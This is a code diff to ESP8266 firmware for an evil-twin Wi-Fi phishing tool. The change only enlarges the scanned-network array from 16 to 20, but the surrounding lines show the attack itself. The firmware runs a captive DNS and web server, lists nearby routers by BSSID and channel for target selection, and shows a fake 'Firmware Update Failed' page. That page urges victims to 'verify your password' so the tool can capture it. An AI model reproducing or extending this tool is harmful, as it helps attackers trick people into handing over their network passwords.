@@ -35,7 +35,7 @@ const byte DNS_PORT = 53;
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
 
-_Network _networks[16];
+_Network _networks[20];
 _Network _selectedNetwork;
 
 bool is_target_visible = false;
@@ -49,7 +49,7 @@ String _tryPassword = "";
 #define TITLE "<warning class='text-4xl text-yellow-500 font-bold'>&#9888;</warning> Firmware Update Failed"
 #define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br>To revert the old firmware and manually update later, please verify your password."
 
-void clearArray() { for (int i = 0; i < 16; i++) { _networks[i] = _Network(); } }
+void clearArray() { for (int i = 0; i < 20; i++) { _networks[i] = _Network(); } }
 String bytesToStr(const uint8_t* b, uint32_t size) { String str; for (uint32_t i = 0; i < size; i++) { if (b[i] < 0x10) str += '0'; str += String(b[i], HEX); if (i < size - 1) str += ':'; } str.toUpperCase(); return str; }
 void handleEmpty() { webServer.send(204, "text/plain", ""); }
 void handleRedirect() { webServer.sendHeader("Location", "http://192.168.4.1/"); webServer.send(302, "text/plain", "Redirecting..."); }
@@ -61,7 +61,7 @@ void performScan() {
 
   if (n <= 0) {
   } else {
-    for (int i = 0; i < n && i < 16; ++i) {
+    for (int i = 0; i < n && i < 20; ++i) {
       _networks[i].ssid = WiFi.SSID(i);
       memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
       _networks[i].ch = WiFi.channel(i);
@@ -168,7 +168,7 @@ void handleAdmin() {
 
   webServer.sendContent("</div><div class='grid-container'>");
 
-  for (int i = 0; i < 16; ++i) {
+  for (int i = 0; i < 20; ++i) {
     if (_networks[i].ssid == "") break;
     String card_html = "<div class='grid-card'><h3>" + _networks[i].ssid + "</h3>";
     card_html += "<div class='info'><p><strong>BSSID:</strong> " + bytesToStr(_networks[i].bssid, 6) + "</p><p><strong>Channel:</strong> " + String(_networks[i].ch) + "</p></div>";
@@ -220,7 +220,7 @@ void handleStopHotspot() {
 void handleSelectAP() {
   if (webServer.hasArg("ap")) {
     String ap_bssid = webServer.arg("ap");
-    for (int i = 0; i < 16; i++) {
+    for (int i = 0; i < 20; i++) {
       if (bytesToStr(_networks[i].bssid, 6) == ap_bssid) {
         _selectedNetwork = _networks[i];
         break;
